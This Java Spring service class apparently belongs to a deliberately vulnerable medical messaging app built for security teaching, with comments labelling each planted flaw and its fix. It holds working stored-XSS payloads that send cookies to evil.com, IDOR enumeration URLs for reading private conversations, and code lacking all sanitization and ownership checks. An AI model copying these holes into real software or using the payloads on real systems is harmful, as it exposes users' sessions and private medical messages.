package com.mediconnect.service;

import com.mediconnect.dto.ConversationDto;
import com.mediconnect.dto.MessageDto;
import com.mediconnect.entity.Message;
import com.mediconnect.entity.User;
import com.mediconnect.repository.MessageRepository;
import com.mediconnect.repository.UserRepository;
import lombok.RequiredArgsConstructor;
import org.springframework.stereotype.Service;

import java.time.LocalDateTime;
import java.util.ArrayList;
import java.util.Comparator;
import java.util.List;
import java.util.stream.Collectors;

@Service
@RequiredArgsConstructor
public class MessageService {

    private final MessageRepository messageRepository;
    private final UserRepository userRepository;

    // [A05] Stored XSS — content is written to the database verbatim without any sanitization.
    //
    //  Attack payloads stored and returned to every recipient:
    //    {"content": "<script>document.location='https://evil.com/?c='+document.cookie</script>"}
    //    {"content": "<img src=x onerror=fetch('https://evil.com/?c='+document.cookie)>"}
    //    {"content": "<svg onload=eval(atob('base64payload'))>"}
    //
    // [A07] Mass Assignment — senderId taken directly from the request body.
    //        An attacker can impersonate any other user:
    //        {"senderId": 5, "receiverId": 2, "content": "..."} → message appears to be from user 5.
    //
    //  Secure: senderId must be read exclusively from the JWT SecurityContext;
    //          content must be sanitized (e.g., Jsoup.clean() with a strict whitelist).
    public MessageDto send(MessageDto dto) {
        User sender = userRepository.findById(dto.getSenderId())
                .orElseThrow(() -> new RuntimeException("Sender not found: " + dto.getSenderId()));
        User receiver = userRepository.findById(dto.getReceiverId())
                .orElseThrow(() -> new RuntimeException("Receiver not found: " + dto.getReceiverId()));

        Message message = Message.builder()
                .sender(sender)
                .receiver(receiver)
                // [A05] content stored verbatim — <script>, <img onerror=>, <svg onload=> all pass through
                .content(dto.getContent())
                .sentAt(LocalDateTime.now())
                .build();

        return toDto(messageRepository.save(message));
    }

    // [A01] IDOR — viewerId is accepted as a parameter and never verified against
    //        the authenticated principal from the JWT token.
    //        Any caller can supply arbitrary viewerId and userId values to read
    //        the private medical conversation between any two users.
    //
    //  Attack:
    //    GET /api/messages/conversation/2?viewerId=1  → reads conversation between user 1 and user 2
    //    GET /api/messages/conversation/3?viewerId=1  → reads conversation between user 1 and user 3
    //    (iterate userId to harvest all private conversations in the system)
    //
    //  Secure: viewerId must be taken from SecurityContext and compared to both
    //          sender and receiver fields before returning any messages.
    public List<MessageDto> getConversation(Long viewerId, Long otherUserId) {
        // [A01] viewerId is never compared against SecurityContext — no authentication enforced
        List<Message> sent     = messageRepository.findBySenderIdAndReceiverId(viewerId, otherUserId);
        List<Message> received = messageRepository.findBySenderIdAndReceiverId(otherUserId, viewerId);

        List<Message> all = new ArrayList<>();
        all.addAll(sent);
        all.addAll(received);
        all.sort(Comparator.comparing(Message::getSentAt));

        return all.stream().map(this::toDto).collect(Collectors.toList());
    }

    // [A01] Broken Access Control — no ownership check before deletion.
    //        Any caller can delete any message by its id.
    //        With SecurityConfig.permitAll() no authentication is required at all.
    //
    //  Secure: message.getSender().getId().equals(authenticatedUserId)
    public void deleteById(Long id) {
        // [A01] Missing: if (!message.getSender().getId().equals(currentUserId)) throw Forbidden
        messageRepository.findById(id)
                .orElseThrow(() -> new RuntimeException("Message not found: " + id));
        messageRepository.deleteById(id);
    }

    public List<MessageDto> getInbox(Long userId) {
        // [A01] No check that userId matches the authenticated caller
        return messageRepository.findByReceiverId(userId)
                .stream().map(this::toDto).collect(Collectors.toList());
    }

    public MessageDto markAsRead(Long id) {
        Message message = messageRepository.findById(id)
                .orElseThrow(() -> new RuntimeException("Message not found: " + id));
        // [A01] No check that the caller is the receiver of this message
        message.setReadAt(LocalDateTime.now());
        return toDto(messageRepository.save(message));
    }

    // [A01] userId accepted as query param, never verified against JWT principal
    public List<ConversationDto> getConversations(Long userId) {
        List<Message> sent     = messageRepository.findBySenderId(userId);
        List<Message> received = messageRepository.findByReceiverId(userId);

        java.util.Map<Long, java.util.List<Message>> byPartner = new java.util.HashMap<>();
        for (Message m : sent) {
            byPartner.computeIfAbsent(m.getReceiver().getId(), k -> new ArrayList<>()).add(m);
        }
        for (Message m : received) {
            byPartner.computeIfAbsent(m.getSender().getId(), k -> new ArrayList<>()).add(m);
        }

        return byPartner.entrySet().stream().map(entry -> {
            List<Message> msgs = entry.getValue().stream()
                    .sorted(Comparator.comparing(Message::getSentAt))
                    .collect(Collectors.toList());
            Message last = msgs.get(msgs.size() - 1);
            long unread = msgs.stream()
                    .filter(m -> m.getReceiver().getId().equals(userId) && m.getReadAt() == null)
                    .count();
            User partner = userRepository.findById(entry.getKey())
                    .orElseThrow(() -> new RuntimeException("User not found: " + entry.getKey()));
            return ConversationDto.builder()
                    .userId(partner.getId())
                    .email(partner.getEmail())
                    .lastMessage(last.getContent())
                    .unread(unread)
                    .build();
        }).collect(Collectors.toList());
    }

    private MessageDto toDto(Message m) {
        return MessageDto.builder()
                .id(m.getId())
                .senderId(m.getSender().getId())
                .senderEmail(m.getSender().getEmail())
                .receiverId(m.getReceiver().getId())
                // [A05] content returned verbatim — XSS payload is delivered untouched
                .content(m.getContent())
                .sentAt(m.getSentAt())
                .readAt(m.getReadAt())
                .read(m.getReadAt() != null)
                .build();
    }
}
